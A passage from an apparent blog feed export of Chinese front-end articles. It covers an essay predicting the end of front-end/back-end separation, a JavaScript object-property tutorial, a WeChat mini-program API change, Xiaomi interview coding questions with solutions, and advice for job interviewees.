<p>1.数据可视化<br>2.IOT前端架构<br>3.跨平台技术，flutter,weex,rn等<br>4.前端智能组件技术<br>5.WebRTC实时音视频技术<br>6.Serverless技术<br>7.跨端小程序，小游戏<br>8.Css环境感应技术<br>9.javascript面向硬件编程<br>10.同构架构</p>
<p>结合公司现在的状况和个人兴趣，打算花费一个季度的时间去研究并落地<code>Serverless技术</code>，实现接口的BFF能力。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>前后端一体化：前后端分离将死？</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%89%8D%E5%90%8E%E7%AB%AF%E4%B8%80%E4%BD%93%E5%8C%96:%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%B0%86%E6%AD%BB%EF%BC%9F/</url>
    <content><![CDATA[<p>PS：本文所针对的场景，都是复杂业务场景下的 Web 应用。简单的 Web 应用不适合复杂的架构模式，它为带来巨大的成本。</p>
<p>在接触了领域驱动设计的概念，其中关于核心域的想法让人颇为激动。而在微服务架构中，核心域是一个或者多个服务的域，而位于核心域的核心则是领域模型。简单地来说，对于一个系统来说，它的核心的核心的 ”核心“ 就是：领域模型。</p>
<p>过去，当我们谈及领域模型的时候，我们往往将其置于 Web 后端的领域。当我 GET 了一些基本的理念之后，便尝试整合到前端架构中。去年，我开始了 在项目上的第一次尝试，并在 GitHub 上创建了 <a href="https://github.com/phodal/clean-frontend">clean-frontend</a> 项目，它以 Angular 作为示例，介绍了如何开发一个整洁前端架构的前端应用。</p>
<h2 id="引子-1：模型一致化"><a href="#引子-1：模型一致化" class="headerlink" title="引子 1：模型一致化"></a>引子 1：模型一致化</h2><p>我习惯于在公司的项目中引入成熟的框架，从几年前的 Angular.js 到近几年的 Angular，完整的框架能为企业带来更少的维护成本，从而降低软件开发成本。几年前，我们引入了 Angular 之后，便开始大量地 TypeScript 项目实践。作为一个支持静态类型的语言，它非常适合于开发大型应用、企业应用，在这一点上你可以从 React、Vue 等框架建议使用 TypeScript 看到一种趋势。</p>
<p>采纳了 TypeScript 之后，当前端从后端获取到数据之后，那么它需要将 JSON 数据映射到对应的 interface。如此一来，前端的模型也就有了对应的领域模型。而这个数据模型和后端的数据模型应该是完成一致的，但是实际上，它往往是落后的。后端的 API 发生的变更之后，才需要前端同步去修改模型。</p>
<p>而当我作为一个前端的 Tech Lead 来考虑这个问题的时候，我首先想到的是：读取后端的 Java 代码，然后生成对应的前端模型。在没有造 Chapi 的轮子之前，通过 TypeScript Compiler 转换获得对应的类型，是我觉得比较靠谱的方案。在有了 Chapi 之后，我觉得它们都是小问题了。</p>
<p>不过，然后我一想这样做的意义并不大，还不如：套用后端的契约测试，造一个前端的自动化契约测试，即：<a href="http://github.com/phodal/mest">mest</a>。它通过 API 返回数据和 TypeScript 的 Interface 来完成对于契约的测试。一个简单的测试数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url,interface</span><br><span class="line">https:&#x2F;&#x2F;phodal.github.io&#x2F;mest-test&#x2F;error.json,mock&#x2F;IError.ts</span><br></pre></td></tr></table></figure>

<p>通过 HTTP 请求获取对应的测试数据，再将其与本地的模型进行比较。</p>
<p>不过呢，我们还要使用 JavaScript 语言重写部分 Java 代码，那么我们为什么不要 JavaScript / TypeScript 重写一切呢？</p>
<h2 id="引子-2：JavaScript-TypeScript-重写一切"><a href="#引子-2：JavaScript-TypeScript-重写一切" class="headerlink" title="引子 2：JavaScript / TypeScript 重写一切"></a>引子 2：JavaScript / TypeScript 重写一切</h2><p>遗憾的是，使用 JavaScript 编写后端应用（BFF、胶水层除外），在大部分的大公司是比较难的。内部的生态链和运维影响了技术决策，使用 C++ 不香吗，使用 JavaScript 会存在无人在背后支持。</p>
<h3 id="纯-Node-js-后端应用"><a href="#纯-Node-js-后端应用" class="headerlink" title="纯 Node.js 后端应用"></a>纯 Node.js 后端应用</h3><p>在过去的几年里，我建议：小公司的后端应用<strong>不要</strong>使用 JavaScript / TypeScript 编写，因为运维、监控、APM 等生态尚不够完善。小公司应该优先投资于业务领域，在基础设施的投入见效比较短，除非能控制好开发人员的流动性。</p>
<p>不过，不管怎样，已经有大量的小公司因为人力成本的原因，已经使用上了 Node.js 来开发后端应用。</p>
<h3 id="Serverless-应用"><a href="#Serverless-应用" class="headerlink" title="Serverless 应用"></a>Serverless 应用</h3><p>而随着 JavaScript 系生态的完善，基础设施已经不是会成为小公司的负担，我便觉得这是一个好的时机。不过，我指的是采用 Serverlesss 架构，而非自建 JavaScript 系生态。Serverless 不仅帮助小企业解决了基础设施的问题，还能为小企业降低软件运维成本。一旦企业做大之后，也可以自建采用 OpenFaas 等开源方案解决 Serverless 的供应商锁定问题。</p>
<p>不论是 Node.js 后端应用还是 Serverless 应用，因为使用的是同一种语言，我们可以轻松地在前后端之间共享代码，可以是 Git submodule、NPM 包、远程等等的方式。</p>
<h2 id="引子-3：纯编译到-JavaScript"><a href="#引子-3：纯编译到-JavaScript" class="headerlink" title="引子 3：纯编译到 JavaScript"></a>引子 3：纯编译到 JavaScript</h2><p>市面上有各种各样支持 compile to js 的语言、框架，诸如于 Kotlin.js、Scala.js、Python.js 等等。</p>
<p>对于小前端的应用来说，这种架构非常的不错。它相当于是渐进式的系统架构方案，当前采用了主流的前端框架，而非传统的后端渲染机制，并统一了技术栈，降低了组织内部的学习成本。不过，它带来额外的调试因素，毕竟每多一层封装，系统的复杂度就需要 * 2。</p>
<p>而为了让框架的使用者支持不同的框架 React、Angular、Vue，这个框架还需要提供这些框架的 bind 或者是 wrapper，以提升框架使用者的幸福感。</p>
<p>但是，我们的挑战依然是复杂的前端应用，以及它难以消除交互的复杂度。</p>
<h2 id="引子-4：共享领域模型-模式库"><a href="#引子-4：共享领域模型-模式库" class="headerlink" title="引子 4：共享领域模型/模式库"></a>引子 4：共享领域模型/模式库</h2><p>开始之前，我不得不强调一，领域模型是一种包含数据和行为的抽血模型。</p>
<p>编译到 JavaScript 是一种轻前端的方案，而对于重前端的项目来说，它们完成可以采用一种新的模式：共享领域模型。即将领域模型作为模式库，提供给前后端一起使用。即，我们只需要编译所需要的部分。</p>
<p>这在我使用了 Kotlin 的多平台技术（multiplatform）重写了 Chapi 的 domain 层之后，我意识到了这是一个非常迷人的方案。我即使用在前端代码中使用 Chapi 的领域模型，我还需要在后端的代码中使用这套模型。原先，我需要手动翻译一行行代码，现在我并不需要这样的一个步骤。只需要在 pom.xml、build.gradle 或者是 package.json 中引入依赖及其对应的版本即可。</p>
<p>在引入了这部分的代码之后，我们再关注于 UI 交互部分即可。</p>
<h2 id="引子-5：领域模型编译到-WASM"><a href="#引子-5：领域模型编译到-WASM" class="headerlink" title="引子 5：领域模型编译到 WASM"></a>引子 5：领域模型编译到 WASM</h2><p>考虑到并非所有的语言都能支持 compile to JavaScript，一种颇为有效的方式就是使用 WASM。</p>
<blockquote>
<p>WebAssembly 或称 wasm 是一个实验性的低端编程语言，应用于浏览器内的客户端。WebAssembly 将让开发者能运用自己熟悉的编程语言编译，再藉虚拟机引擎在浏览器内运行。 —— <a href="https://zh.wikipedia.org/zh-cn/WebAssembly">维基百科</a></p>
</blockquote>
<p>我尝试将使用 Go 编写的 Coca 编译成 WASM，但是遇到一系列的问题（我已经忘了），体积似乎是个问题，所以我尝试使用 Rust 去构建另外一种可能性。Rust 官方提供了 Rust Webpack Template，因此我可以将其集成到我现有的前端应用中。只是呢，似乎还没有人会使用 Rust 去编写后端应用。</p>
<p>但是 WASM 提供了一种更友好的方式，即我们不需要重写现有的代码，而是只需要添加一些代码，便可以将现有的后端模型代码提到给前端使用。并且，与混淆后的 JavaScript 相比，它看上去更加安全 —— 学习成本更高一些。</p>
<h2 id="引子-6：ComponentLess"><a href="#引子-6：ComponentLess" class="headerlink" title="引子 6：ComponentLess"></a>引子 6：ComponentLess</h2><p>在研究 Serverless 和微前端的期间，我突然有了一点想法，我对于客户端领域的 Serverless 式架构有了一些基本的构想，叫：ComponentLess。尽管有了一些基础的理念，但是还缺乏一个真实可用的 Demo，所以我并没有定义出什么是 ComponentLess。</p>
<p>起先，我以为无代码编程是一个 ComponentLess 方向，但是一研究发现并不是。无代码编程倾向于可视化编程，而 ComponentLess 倾向于使用 DSL 编程。就这一点来说，我便偏向于使用 Web Components + WAM 技术来构建新的前端架构。</p>
<h3 id="ComponentLess"><a href="#ComponentLess" class="headerlink" title="ComponentLess"></a>ComponentLess</h3><p>从单体应用转向微服务架构的一大特质是，组件（非单指 UI 组件，可以视为服务）由函数调用转向了 HTTP 调用。而 Serverless 进一步地将微服务的服务级别 HTTP 调用，细化为函数级别的 HTTP 调用。</p>
<p>对于前端领域来说，也是如此。微前端将单体应用拆分一个个的独立运行前端应用，我们可以随意地组合这些应用。进一步地，结合诸如于 Web Component 这样的组件级方案，便可以将拆分细分为到 UI 组件的粒度。我们可以使用 （HTML Imports 已遗弃）script 标签从远程导入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;module&quot; src&#x3D;&quot;my-element.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;my-element&gt;&lt;&#x2F;my-element&gt;</span><br></pre></td></tr></table></figure>

<p>因此，在未来，不论是前端开发人员，还是开发人员，都可以通过集成组件的方式来开发应用。也就是说，我们只需要关注于编写核心业务代码即可，剩下的部分可以通过一些特殊的方式来实现。</p>
<h3 id="DSL-抽象化代码"><a href="#DSL-抽象化代码" class="headerlink" title="DSL 抽象化代码"></a>DSL 抽象化代码</h3><p>ComponentLess + Serverless 是<strong>代码即基础设施</strong>开始的一个标志。当代码开始作为基础设施的一部分时，代码便需要以某种方式才能组合到一起。在 Serverless Framework 中，开发人员通过配置接入服务端所使用的基础信息。而 YAML 配置本身也是 DSL 的一种，缺乏灵活度，但是使用非常简单。</p>
<p>事实上，这是两个选择：</p>
<ul>
<li>  配置 + 编程语言。 上手容易，迁移难</li>
<li>  DSL。 上手复杂，易于迁移</li>
</ul>
<p>但是，无论如何我还是如何 DSL，它听上去有着更丰富的 KPI。至于如何抽象化基础设计代码，可以参考《<a href="https://github.com/phodal/cloud-dev">云研发：研发即代码</a>》一文。</p>
<h3 id="模型复用"><a href="#模型复用" class="headerlink" title="模型复用"></a>模型复用</h3><p>不论是 ComponentLess 还是 Serverless，它们都是由函数、UI 组件变为一个独立可运行的单元。为了与别人交互，它需要包含输入和输出。而输入和输出本身是需要一个数据模型作为支撑的，以此才能完成整个系统的稳定性。</p>
<p>而这个话题已经回到我们开头所讨论的内容里。</p>
<h2 id="前后端分离将死？"><a href="#前后端分离将死？" class="headerlink" title="前后端分离将死？"></a>前后端分离将死？</h2><p>在所有的引子里， 我们已经准备了所有的论据，所以只需要：</p>
<ul>
<li>  使用可以跨前后端的语言，构建领域模型</li>
<li>  将后端服务、前端设施细化为更小的组件</li>
<li>  设计 DSL 将领域模型转换到特定平台的代码</li>
</ul>
<p>你就可以杀死前后端分离，就是这么简单。</p>
<p>前后端分离将死，不是现在，但是可能在五年后开始。</p>
<p>你说呢？</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>架构，没有终点。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>对象使用和属性</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%AF%B9%E8%B1%A1%E4%BD%BF%E7%94%A8%E5%92%8C%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<p>JavaScript 中所有变量都可以当作对象使用，除了两个例外 <code>null</code>和 <code>undefined</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">false.toString(); &#x2F;&#x2F; &#39;false&#39;</span><br><span class="line">[1, 2, 3].toString(); &#x2F;&#x2F; &#39;1,2,3&#39;</span><br><span class="line"></span><br><span class="line">function Foo()&#123;&#125;</span><br><span class="line">Foo.bar &#x3D; 1;</span><br><span class="line">Foo.bar; &#x2F;&#x2F; 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个常见的误解是数字的字面值（literal）不能当作对象使用。这是因为 JavaScript 解析器的一个错误， 它试图将<em>点操作符</em>解析为浮点数字面值的一部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2.toString(); &#x2F;&#x2F; 出错：SyntaxError</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>有很多变通方法可以让数字的字面值看起来像对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2..toString(); &#x2F;&#x2F; 第二个点号可以正常解析</span><br><span class="line">2 .toString(); &#x2F;&#x2F; 注意点号前面的空格</span><br><span class="line">(2).toString(); &#x2F;&#x2F; 2先被计算</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="对象作为数据类型"><a href="#对象作为数据类型" class="headerlink" title="对象作为数据类型"></a>对象作为数据类型</h3><p>JavaScript 的对象可以作为<em>哈希表</em>使用，主要用来保存命名的键与值的对应关系。</p>
<p>使用对象的字面语法 - <code>&#123;&#125;</code> - 可以创建一个简单对象。这个新创建的对象从 <code>Object.prototype</code> 继承下面，没有任何<code>自定义属性</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; &#123;&#125;; &#x2F;&#x2F; 一个空对象</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 一个新对象，拥有一个值为12的自定义属性&#39;test&#39;</span><br><span class="line">var bar &#x3D; &#123;test: 12&#125;; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h3><p>有两种方式来访问对象的属性，点操作符或者中括号操作符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var foo &#x3D; &#123;name: &#39;kitten&#39;&#125;</span><br><span class="line">foo.name; &#x2F;&#x2F; kitten</span><br><span class="line">foo[&#39;name&#39;]; &#x2F;&#x2F; kitten</span><br><span class="line"></span><br><span class="line">var get &#x3D; &#39;name&#39;;</span><br><span class="line">foo[get]; &#x2F;&#x2F; kitten</span><br><span class="line"></span><br><span class="line">foo.1234; &#x2F;&#x2F; SyntaxError</span><br><span class="line">foo[&#39;1234&#39;]; &#x2F;&#x2F; works</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>两种语法是等价的，但是中括号操作符在下面两种情况下依然有效</p>
<ul>
<li>  动态设置属性</li>
<li>  属性名不是一个有效的变量名：**比如属性名中包含空格，或者属性名是 JS 的关键词）</li>
</ul>
<p>在 <code>JSLint</code>语法检测工具中，点操作符是推荐做法。</p>
<h3 id="删除属性"><a href="#删除属性" class="headerlink" title="删除属性"></a>删除属性</h3><p>删除属性的唯一方法是使用 <code>delete</code> 操作符；设置属性为 <code>undefined</code> 或者 <code>null</code> 并不能真正的删除属性， 而<strong>仅仅</strong>是移除了属性和值的关联。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj &#x3D; &#123;</span><br><span class="line">    bar: 1,</span><br><span class="line">    foo: 2,</span><br><span class="line">    baz: 3</span><br><span class="line">&#125;;</span><br><span class="line">obj.bar &#x3D; undefined;</span><br><span class="line">obj.foo &#x3D; null;</span><br><span class="line">delete obj.baz;</span><br><span class="line"></span><br><span class="line">for(var i in obj) &#123;</span><br><span class="line">    if (obj.hasOwnProperty(i)) &#123;</span><br><span class="line">        console.log(i, &#39;&#39; + obj[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的输出结果有 <code>bar undefined</code> 和 <code>foo null</code> - 只有 <code>baz</code> 被真正的删除了，所以从输出结果中消失。</p>
<h3 id="属性名的语法"><a href="#属性名的语法" class="headerlink" title="属性名的语法"></a>属性名的语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var test &#x3D; &#123;</span><br><span class="line">    &#39;case&#39;: &#39;I am a keyword so I must be notated as a string&#39;,</span><br><span class="line">    delete: &#39;I am a keyword too so me&#39; &#x2F;&#x2F; 出错：SyntaxError</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对象的属性名可以使用字符串或者普通字符声明。但是由于 JavaScript 解析器的另一个错误设计， 上面的第二种声明方式在 ECMAScript 5 之前会抛出 <code>SyntaxError</code> 的错误。</p>
<p>这个错误的原因是 <code>delete</code> 是 JavaScript 语言的一个<em>关键词</em>；因此为了在更低版本的 JavaScript 引擎下也能正常运行， 必须使用<em>字符串字面值</em>声明方式。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>小程序登录、用户信息相关接口调整</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%99%BB%E5%BD%95%E3%80%81%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9B%B8%E5%85%B3%E6%8E%A5%E5%8F%A3%E8%B0%83%E6%95%B4/</url>
    <content><![CDATA[<p>微信小程序都无法显示用户头像了，昵称还都变成了【微信用户】，后来查找微信的官方文档发现，以前用的getuserinfo的接口更新了。现在这个接口只能获取匿名的一些信息，而不再像以前一样，能获取到用户的基本信息了。<br>既然找到了问题的原因，那么就好解决了。<br>在授权的页面，将之前的getuserinfo 更换成getUserProfile这个接口就可以了，然后将信息重新对接到以前的逻辑里面。<br>详细信息参考：<a href="https://developers.weixin.qq.com/community/develop/doc/000cacfa20ce88df04cb468bc52801">小程序登录、用户信息相关接口调整说明</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>小米Web前端JavaScript面试题</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%B0%8F%E7%B1%B3Web%E5%89%8D%E7%AB%AFJavaScript%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    <content><![CDATA[<p>一、<br>请定义这样一个函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function repeat (func, times, wait) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数能返回一个新函数，比如这样用<br>var repeatedFun = repeat(alert, 10, 5000)<br>调用这个 repeatedFun (“hellworld”)<br>会alert十次 helloworld, 每次间隔5秒<br>二、<br>写一个函数stringconcat， 要求能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var result1 &#x3D; stringconcat(&quot;a&quot;, &quot;b&quot;)  result1 &#x3D; &quot;a+b&quot;</span><br><span class="line">var stringconcatWithPrefix &#x3D; stringconcat.prefix(&quot;hellworld&quot;);</span><br><span class="line">var result2 &#x3D; stringconcatWithPrefix(&quot;a&quot;, &quot;b&quot;)  result2 &#x3D; &quot;hellworld+a+b&quot;</span><br></pre></td></tr></table></figure>

<p>/**</p>
<ul>
<li><p>第一题</p>
</li>
<li><p>@param func</p>
</li>
<li><p>@param times</p>
</li>
<li><p>@param wait</p>
</li>
<li><p>@returns {repeatImpl}</p>
</li>
<li><p>/<br>function repeat (func, times, wait) {<br>  //不用匿名函数是为了方便调试<br>  function repeatImpl(){</p>
<pre><code>  var handle,
      _arguments = arguments,
      i = 0;
  handle = setInterval(function()&#123;
      i = i + 1;
      //到达指定次数取消定时器
      if(i === times)&#123;
          clearInterval(handle);
          return;
      &#125;
      func.apply(null, _arguments);
  &#125;,wait);
</code></pre>
<p>  }</p>
<p>  return repeatImpl;<br>}</p>
</li>
</ul>
<p>//测试用例<br>var repeatFun = repeat(alert, 4, 3000);</p>
<p>repeatFun(“hellworld”);</p>
<p>/**</p>
<ul>
<li><p>第二题</p>
</li>
<li><p>@returns {string}</p>
</li>
<li><p>/<br>function stringconcat(){<br>  var result = [];</p>
<p>  stringconcat.merge.call(null, result, arguments);<br>  return result.join(“+”);<br>}</p>
</li>
</ul>
<p>stringconcat.prefix = function(){<br>    var _arguments = [],<br>        _this = this;</p>
<pre><code>_this.merge.call(null, _arguments, arguments);

return function()&#123;
    var _args = _arguments.slice(0);

    _this.merge.call(null, _args, arguments);
    return _this.apply(null, _args);
&#125;;
</code></pre>
<p>};</p>
<p>stringconcat.merge = function(array, arrayLike){<br>    var i = 0;</p>
<pre><code>for(i = 0; i &lt; arrayLike.length; i++)&#123;
    array.push(arrayLike[i]);
&#125;
</code></pre>
<p>}</p>
<p>//测试用例<br>var result1 = stringconcat(“a”, “b”); //result1 = “a+b”<br>var result3 = stringconcat(“c”, “d”); //result1 = “a+b”</p>
<p>var stringconcatWithPrefix = stringconcat.prefix(“hellworld”);<br>var stringconcatWithPrefix1 = stringconcat.prefix(“hellworld1”);</p>
<p>var result2 = stringconcatWithPrefix(“a”, “b”); //result2 = “hellworld+a+b”<br>var result4 = stringconcatWithPrefix1(“c”, “d”); //result2 = “hellworld+a+b”</p>
<p>alert(result1);<br>alert(result2);<br>alert(result3);<br>alert(result4);</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>写给前端面试者</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%86%99%E7%BB%99%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E8%80%85/</url>
    <content><![CDATA[<p>不管是刚毕业踏入社会的还是在职场久经奋战的，都经历过被面这一环节。当然也有很多同学开始在面人，为自己的团队选择优秀的血液。而我也是属于这一类，这些年都有在帮公司或朋友的团队物色人才和面试同学。今年在手淘也一样，在给同学面试过程中，让我开始在思考，而且思考了很久，所以这几天静下来写了这篇文章，希望这篇文章对于刚毕业的大学生或者还在继续参加工作面试的同学有所帮助。</p>
<p>在这篇文章中，将不涉及任何的面试题，我只想和大家聊聊面试者与被面者之间的感受。</p>
<p><strong>什么是前端</strong></p>
<p>什么是前端？在这里不做阐述，如果您对这个问题感兴趣的话，建议您可以阅读早前写过的一篇博文**<a href="http://www.w3cplus.com/front-end-trip-on-road.html">《前端路上的旅行》</a>**，文章中对什么是前端做过一些介绍，虽然不是非常的准确，但大概意思是表达到了。</p>
<p><strong>为什么选择前端</strong></p>
<p>对于这样的问题，是找不到准确而又正确的答案。既然您参加的面试是有关于前端的工作，那么试问？您有思考过这个问题吗？</p>
<p>如果你是一位从事过前端工作的同学，你或许会这样回答：</p>
<ul>
<li>  我喜欢前端，前端的工作给我即写即得，比起编程更为简单，更知性</li>
<li>  前端入门的门槛低，一不小心就入这个行业，后悔已莫及</li>
<li>  无奈的选择，当初团队没前端，从别的职位转过来的，然后就这样干下来了</li>
<li>  前端前景大，大家都知道**<a href="http://100offer.com/blog/posts/83">全世界都在招前端</a><strong>，而且都很难招（</strong><a href="http://www.zhihu.com/question/19923687">知乎上的热贴：为什么前端工程师很难找？</a>**）</li>
<li>  或许还有更多的回答…</li>
</ul>
<p>但对于刚毕业的同学，还从未踏入过职场的大学生而言，或许就从未没有思考过，为什么自己选择前端？我臆测下，可能有这样的几个场景：</p>
<ul>
<li>  学长拉下水，不知不觉去面试了前端</li>
<li>  非计算机专业而对自己专业又不太感兴趣，但又为了毕业之后有份工作，找了门好学的，容易混饭的先整上</li>
<li>  盲目的跟风，听说前端好，那就前端吧</li>
<li>  无任何职业的未来思考，首先解决毕业后的工作问题</li>
<li>  或许还能很多不同的场景…</li>
</ul>
<p>不管你是什么样的出发点，既然你选择去面试前端这样的一份工作，你是否有静下心来思考过，自己为什么选择这个行业（甚至可以说，你一点都不了解的行业）。说实在的，还是很多前端面试官会问你这样的一个问题？虽然这样的问题，没有准确或者规范的答案，毕竟不是技术问题，有源可查。</p>
<p><strong>面试前的一些准备工作</strong></p>
<p>说实在的，面试是一件非常头疼的事情。每个人都痛恨面试。虽然你面试的工作机会不一定能拿到，但这也并不意味着你在这方面的能力不行。主要是因为面试的不确定因素太多太多，而且面试还需要一些技巧，不管是面试官或被面者。</p>
<p>不同的人，会因为不同的因素获得不同的面试资格。或许你参加面试的时候，直到面试官坐在你面前之前，有可能他都没有看过或者记得你的简历内容（这样的情景是存在的）。当然，也有另外一个场景，在面试官坐到你面前之前，面试官司通过不同的途径对你已做了一些了解。</p>
<p>就此而言，参加面试者应该做这样的假设：面试官将会深入调查你。因此，当你参加面试之前，你应该做一些准备工作：</p>
<p><strong>用心写好简历</strong></p>
<p>简历是你向面试官展示自己的第一张名片。简历的好也坏直接会影响你在面试官心中的第一印象(这个一点也不夸张)。对于有工作经验的同学，一份好的简历应该做到：</p>
<blockquote>
<p>要低调的告诉招聘方，爷很NB。</p>
</blockquote>
<p>如何做到这一点，可以看看@Easy给程序员写简历的建议**<a href="http://get.jobdeer.com/744.get">《如何写好技术简历》</a>**。</p>
<p>而对于应届毕业生，要注意的就更多了。虽然你没有过多的经验，但你要做到你的简历简单明了，具有较强的针对性，切勿简历上介绍自己<strong>精通xxx语言，获得xxx奖学金，得了xxx奖</strong>之类，这一切都是浮云，面试官不会因为你在学校当了什么会的干部，拿了多少奖学金太感兴趣，面试官对你感兴趣的是，你在学校做了什么事情，你有什么作品可拿出手。</p>
<p>那么什么是好简历？简单描述几点：</p>
<ul>
<li>  <strong>匹配：</strong>简历上每一个元素为应聘岗位而“生”；</li>
<li>  <strong>措辞：</strong>行文流畅，容易理解，描述具体而明确；</li>
<li>  <strong>模板：</strong>商务简洁，突出胜任岗位的核心竞争力。</li>
</ul>
<p>有两点特别强调一下：<strong>尽量让你的信息在一页上展示完；不要使用表格来做你的简历。</strong> 而现在的学生，简历大多都是使用表格来制作(至少我很讨厌使用表格制作的简历)。</p>
<p><strong>保持通信顺畅</strong></p>
<p>保持通信的顺畅是很重要的一点，直接会影响你会不会失去一次面试的机会。因为联系你大多都会直接通过简历上的电话。如果面试官想通知你参加面试，而你的电话总是处理关机或者无法接通的情景之下，可想而知，你将会失去这样的一次机会，而这样的一次机会或许就是改变你命运的一次机会。</p>
<p>这次校招我就碰到这样的现象，打电话给大学生通知其面试，但总是处于无法接通。可想而知，就算我再求闲若渴，我也没有这么的时间给你不停的打电话。</p>
<p>需不需要准备面试题</p>
<p>很多同学喜欢去搜集一些前端面试题，而且网上这样的面试题也非常的多，比如：</p>
<ul>
<li>  <a href="http://segmentfault.com/a/1190000000465431">前端开发面试题</a></li>
<li>  <a href="http://www.w3cplus.com/css/front-end-web-development-quiz.html">Web前端开发测试题</a></li>
<li>  <a href="https://github.com/h5bp/Front-end-Developer-Interview-Questions">Front-end Job Interview Questions</a></li>
<li>  <a href="http://www.moejser.com/post/qian-duan-kai-fa/han-dong-winterde-mian-shi-ti">寒冬winter的面试题</a></li>
<li>  <a href="http://www.w3cplus.com/css/interview-question-css.html">有关于CSS的面试题和练习</a></li>
</ul>
<p>那么去面试前准备这些题的答案是否有用处（很多面霸把网上出现的题都撸了个遍）。下面发表一下个人看法。</p>
<p>个人认为这些题只能帮助你对相关知识有一定的了解，但对于拿去应付面试还是有所欠缺。你花时间只是背下了这些题的答案，有可能你并没有吃透其中的为什么？就算面试官问到了其中的一些题，你一开始会觉得很幸运，你知道答案是什么？但你没有考虑到的是，就算你碰到了，你知道了答案，你根本无法知道面试官就此题会接下来问你什么。可想而知，如果你只是背题，接下来的为什么？你可能就不知道回答了。</p>
<p>就我个人而言，我一般不备题，随时根据面试者的自我介绍和相关了解之后才出题。对于这样的随机性，你的备题方案是否还有用处呢？</p>
<p>当然，古人云“有备无患”，这是好事，经过这些题，爱钻研的会去再问为什么？不爱钻研的也对相关知识有一个面的了解。最主要的是，面试碰到了相关的题，你不会再紧张，你会有些许的自信。</p>
<p><strong>面试要注意的细节</strong></p>
<p>细节很多时候会决定你的成败。那么在第一次参加面试时还是有些细节需要注意。</p>
<p><strong>时间观念</strong></p>
<p>可能跟你首页基本上是会通过电话或者视频面试，一是节约彼此时间。那么这个时候不管是面试官或被面者都需要有一定的时间观念，不能迟到。如果你有事情会耽搁，应该事先通知彼此。而在现实中没有时间观念的还是很多的。我讲两个自己亲身经历过的事情。</p>
<p>记得有一次在上海去一家公司面试前端。约好的时间是下午两点钟。我请了个假，屁颠屁颠的到达目的地，填好表格。面试方行政通知我等几分钟，面试官就来。可我足足等了半小时，还未见到面试官影子。追问之下，行政告诉我，已通知面试官了，稍后就到。可我等了近一个小时之后，还是没有见到面试官，如此之下，我闪人了。结果在地铁中接到人事电话，问我为什么走了？那么答案还需要我说吗？</p>
<p>上面是自己去被面的一次经历，那么今年面试一大学生，经历的故事让我直接无语。提前一天约好时间面试，结果小朋友告诉我在外面办理事情，不能面试。为了招到人才，我也就忍了，再次约好下午某个时间点，当我再次打电话去的时候，小朋友告诉我马上要和同学去聚餐。此时的我，真想大声吼两声，昵玛，没时间别答应我呀，可我还是忍了。</p>
<p>不管是哪种情形，没有时间观念和失约对于被面者和面试官都不是一个好的体验。何况我们的工作，其中有一个较为重要的就是让你的用户体验好。而且这已不是一个简单的细节，而是失去自己为人的原则，再高一点就是诚信都失了，何来的机会。</p>
<p><strong>真诚面对</strong></p>
<p>当你的技术不能达标时，只要你的人品达标，也能为自己增加不少分数。可能是由于自己的情节，我个人较为喜欢诚实的孩子。喜欢说一不二的孩子。因为你的诚实有可能会打动你的面试官，他会觉得你是可塑之才，说不定给你一个机会。或许很多人都会讨厌那种浮夸之徒吧。自己不会又想想尽一切办法，在面试官面前展示你这方面很优秀，其实有时候这样做会得到相反的效果。</p>
<p><strong>尽量展示自己的软实力</strong></p>
<p>每个人都有自己好的一面也有自己不足的一面，那么在面试的时候，应该尽量展示自己优秀的一面。对于校招生或实习生而言，面试官真的不太在乎你所掌握的技术如何？而更再意的是你是不是有发展的潜力。你处事的能力，学习的能力，解决问题的能力等等。而自己问题都是在和你聊天的过程中去掌握的，所以你应该借此机会，向面试官展示你这方面的软实力。</p>
